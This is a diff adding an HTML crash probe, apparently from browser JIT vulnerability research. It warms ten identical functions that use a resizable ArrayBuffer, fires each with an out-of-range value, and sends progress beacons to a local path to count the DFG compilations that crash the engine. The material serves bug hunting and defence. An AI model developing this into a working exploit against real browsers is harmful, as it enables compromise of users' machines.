@@ -1,0 +1,56 @@
+<!--
+  p608e: Count resizable+fill DFG compilations to crash
+
+  p608d showed: plain functions don't trigger the crash (Section A survived).
+  Section B (5 resizable+fill in batch) crashes, but we need the exact count.
+
+  This probe warms resizable+fill functions ONE AT A TIME with beacons between
+  each to identify the exact DFG compilation count that triggers the crash.
+
+  Each function is structurally identical (Uint32Array + resizable + 5 fillers)
+  but declared separately so the DFG compiles each independently.
+
+  CRASH_CLASS: MODERATE
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p608e</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m),false);x.send();}catch(e){}}
+
+function main(){
+b('P608E-COUNT-TO-CRASH');
+
+// Each function is a separate DFG compilation unit.
+// All identical: Uint32Array + resizable AB + 5 fillers.
+// Warmed one at a time with beacon BEFORE and AFTER.
+
+function t1(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t2(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t3(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t4(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t5(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t6(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t7(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t8(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t9(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+function t10(sv,fo){var ab=new ArrayBuffer(0x100,{"maxByteLength":0x1000});var ta=new Uint32Array(ab);var v=0;var a=fo[0];var c=fo[1];var d=fo[2];var e=fo[3];var f=fo[4];ta[3]=sv;a.y={};c.y={};d.y={};e.y={};f.y={};return v;}
+
+var fns = [t1,t2,t3,t4,t5,t6,t7,t8,t9,t10];
+
+for(var n=0; n<fns.length; n++){
+    var fl=[];for(var i=0;i<8;i++)fl.push({x:1});
+    b('FN'+(n+1)+'-WARMUP-START');
+    for(var i=0;i<0x1000;i++) fns[n](42, fl);
+    b('FN'+(n+1)+'-WARMUP-DONE');
+    try{
+        fns[n](0xffffffff, fl);
+        b('FN'+(n+1)+'-FIRE-SURVIVED');
+    }catch(e){
+        b('FN'+(n+1)+'-FIRE-EXCEPTION:'+e.message);
+    }
+}
+
+b('P608E-COMPLETE');
+}
+
+setTimeout(main, 200);
+</script></head><body>p608e: count to crash</body></html>
